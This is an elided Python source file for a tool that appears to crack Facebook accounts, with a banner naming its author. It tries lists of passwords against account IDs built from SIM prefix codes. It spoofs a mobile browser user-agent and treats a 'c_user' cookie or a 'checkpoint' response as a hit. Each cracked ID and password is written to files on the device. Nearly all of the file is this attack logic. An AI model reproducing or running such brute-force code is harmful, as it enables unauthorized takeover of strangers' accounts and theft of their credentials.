...
\33[1;37m----------------------------------------------
→   Owner      :  Md SUYAIF Hasan
→   Facebook   : Md SUYAIF Hasan
→   Github     :   SUYAIF-404
...
def menu():
			...
			if rifat in ['1','01']:
				...
				linex()
				print(' Example : /sdcard/✔SUYSAIF✔.txt')
				linex()
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=100067813567675');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97m✔SUYAIF✔\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[✔SUYAIF✔-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/✔SUYAIF✔-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[✔SUYAIF✔-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/✔SUYAIF✔-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[✔SUYAIF✔-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/✔SUYAIF✔-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def bd1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE : 018,019.17,016,014,015.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[✔SUYAIF✔-OK] '+cid+' | '+ps+'\033[1;32m')
				open('✔SUYAIF✔-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[✔SUYAIF✔-CP] '+cid+' | '+ps+'\33[0;97m')
				open('✔SUYAIF✔-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
